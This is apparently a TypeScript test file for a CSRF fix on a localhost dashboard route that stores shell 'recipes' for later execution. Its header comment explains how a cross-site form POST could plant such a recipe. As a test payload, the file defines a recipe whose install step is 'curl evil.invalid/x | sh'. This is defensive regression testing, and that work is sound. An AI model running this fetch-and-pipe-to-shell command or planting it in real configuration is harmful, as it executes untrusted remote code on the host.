// The one write in the dashboard is only accepted from its own page.
//
// Found by a security review of the pushed commits, and it was real. `POST
// /repos/<repo>/onboard` stores a recipe — **arbitrary shell commands the engine later
// executes verbatim** in a sandbox that has a package registry reachable — and it had no
// auth, no token and no origin check.
//
// Binding to `127.0.0.1` is not a defence and it is worth being precise about why, because
// it is the intuition that makes this bug easy to ship: the same-origin policy stops
// another page READING our response; it has never stopped it sending the request. A form
// POST with `application/x-www-form-urlencoded` is a CORS "simple" request, so there is no
// preflight to block it either. Any page the operator visited could have stored a recipe,
// and the next run on that repository would have executed it.
//
// The execution is not even the worst part. ADR-0013 says the approval "is the only
// control there is on a stored command we will execute" — a forged POST is a stored
// command that no human approved, so the invariant onboarding rests on was simply false.

import { afterEach, describe, expect, it, vi } from 'vitest';
import type pg from 'pg';
import { dashboardRoutes } from '../src/routes.js';
import { startStatusServer, type StatusServer } from '../src/sse.js';

const servers: StatusServer[] = [];
afterEach(async () => {
  for (const server of servers.splice(0)) await server.close();
});

/** Answers the two lookups the onboarding route makes: the installation, then the recipe. */
const client = () =>
  ({
    query: vi.fn(async (sql: string) => {
      const rows =
        typeof sql === 'string' && sql.includes('from installations')
          ? [{ repo: 'o/r', installation_id: 1, account: 'o', connected_at: new Date(), removed_at: null }]
          : [];
      return { rows, rowCount: rows.length };
    }),
  }) as unknown as pg.Client;

const serve = async () => {
  const server = await startStatusServer({
    read: async () => [],
    routes: dashboardRoutes({ client: client(), installUrl: 'https://example.invalid' }),
  });
  servers.push(server);
  return `http://127.0.0.1:${server.port}`;
};

/** The recipe an attacker would plant: a command, and the engine runs commands. */
const EVIL = JSON.stringify({ install: 'curl evil.invalid/x | sh', services: [] });

const approve = (base: string, headers: Record<string, string>) =>
  fetch(`${base}/repos/o/r/onboard`, {
    method: 'POST',
    headers: { 'content-type': 'application/x-www-form-urlencoded', ...headers },
    body: new URLSearchParams({ recipe: EVIL }).toString(),
    redirect: 'manual',
  });

describe('a recipe can only be approved from our own page', () => {
  it('refuses the exact shape a malicious page can send', async () => {
    const base = await serve();
    // This is what a browser sends for `<form method=post action="http://127.0.0.1:…">`
    // on someone else's site. No preflight, no opt-in, nothing the operator sees.
    const response = await approve(base, { 'sec-fetch-site': 'cross-site', origin: 'https://evil.invalid' });

    expect(response.status).toBe(403);
    expect(await response.text()).toMatch(/cross-site/);
  });

  it('refuses a same-SITE origin too, because a subdomain is not us', async () => {
    const base = await serve();
    expect((await approve(base, { 'sec-fetch-site': 'same-site' })).status).toBe(403);
  });

  it('refuses on Origin alone, for a browser too old to send Sec-Fetch-Site', async () => {
    const base = await serve();
    expect((await approve(base, { origin: 'https://evil.invalid' })).status).toBe(403);
  });

  it('accepts our own page', async () => {
    const base = await serve();
    const response = await approve(base, { 'sec-fetch-site': 'same-origin' });
    // 303 back to the form: stored.
    expect(response.status).toBe(303);
  });

  it('accepts a request with no browser headers at all', async () => {
    // curl, the CLI, this test. Not a browser, so not forgeable cross-site — forging one
    // already requires code execution on the machine, at which point the recipe is the
    // least of it. Refusing these would break every non-browser client for no gain.
    const base = await serve();
    expect((await approve(base, {})).status).toBe(303);
  });

  it('leaves reads alone, because a projection can be rebuilt from the log', async () => {
    // The check is on writes only. A cross-site GET of a run list discloses nothing an
    // attacker could not get by asking the engine to run, and blocking it would break
    // linking to a run from anywhere.
    const base = await serve();
    const response = await fetch(`${base}/runs`, { headers: { 'sec-fetch-site': 'cross-site' } });
    expect(response.status).toBe(200);
  });
});
